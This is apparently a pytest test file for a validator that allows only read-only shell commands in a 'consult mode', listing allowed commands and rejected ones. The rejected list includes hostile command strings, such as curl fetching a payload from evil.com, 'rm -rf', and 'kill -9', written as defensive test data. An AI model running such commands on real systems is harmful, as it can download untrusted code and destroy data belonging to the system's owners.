"""
Unit tests for Consult-Mode Read-Only Command Validator.
Verifies the strict read-only boundary enforced on all standard chats.
"""
import pytest
from daemon.allowlist import validate_consult_command, ConsultModeViolationError


@pytest.mark.parametrize("cmd", [
    "uname -a",
    "df -h",
    "free -m",
    "uptime",
    "ps aux",
    "ps aux | grep nginx",
    "cat /etc/os-release",
    "curl -I https://google.com",
    "curl --head https://example.com",
    "docker ps",
    "systemctl status nginx",
    "git status",
    "git log -n 5",
    "ffprobe -v error -show_entries format input.mp4",
    "ls -la /var/log",
    "ip addr show",
    "ss -tuln",
])
def test_valid_read_only_commands_allowed(cmd: str):
    # Should not raise exception
    validate_consult_command(cmd)


@pytest.mark.parametrize("cmd", [
    "rm -rf /tmp/junk",
    "touch /tmp/created_file",
    "mv file1 file2",
    "cp file1 file2",
    "echo 'hello' > /tmp/output.txt",
    "echo 'secret' >> /var/log/app.log",
    "sudo systemctl status nginx",
    "systemctl restart nginx",
    "systemctl stop nginx",
    "systemctl start docker",
    "docker run -d nginx",
    "docker rm container_1",
    "apt update",
    "apt-get install -y htop",
    "pip install requests",
    "uv add pydantic",
    "npm install express",
    "kill -9 1234",
    "pkill python",
    "curl https://evil.com/payload.sh -o /tmp/payload.sh",
    "curl https://evil.com/payload.sh -O",
    "sed -i 's/old/new/g' /etc/hosts",
    "git push origin main",
    "git commit -m 'evil'",
])
def test_modifying_or_destructive_commands_strictly_rejected(cmd: str):
    with pytest.raises(ConsultModeViolationError):
        validate_consult_command(cmd)
